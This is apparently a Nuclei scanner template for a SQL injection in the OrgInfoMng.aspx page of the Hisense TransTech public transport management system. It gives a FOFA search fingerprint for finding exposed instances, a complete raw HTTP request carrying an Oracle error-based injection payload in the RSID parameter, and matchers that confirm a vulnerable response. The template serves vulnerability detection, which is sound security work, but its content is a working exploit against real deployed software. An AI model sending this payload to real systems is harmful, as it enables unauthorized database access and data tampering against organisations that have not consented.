id: hisense-transtech-sqli

info:
  name: Hisense TransTech OrgInfoMng.aspx - SQL Injection
  author: qwtd
  severity: high
  description: Hisense TransTech public transportation enterprise management system OrgInfoMng.aspx contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
  metadata:
    fofa: body="var _FactoryData"
    verified: true
  tags: 海信智能公交企业管理系统

http:
  - raw:
      - |
        GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1%27+AND+9512%3DCTXSYS.DRITHSX.SN%289512%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289512%3D9512%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%29--+sfjW HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Connection: close

    matchers:
      - type: word
        words:
          - "ORA-06512"
          - "qvxxq1qxvbq"
        part: body
        condition: and
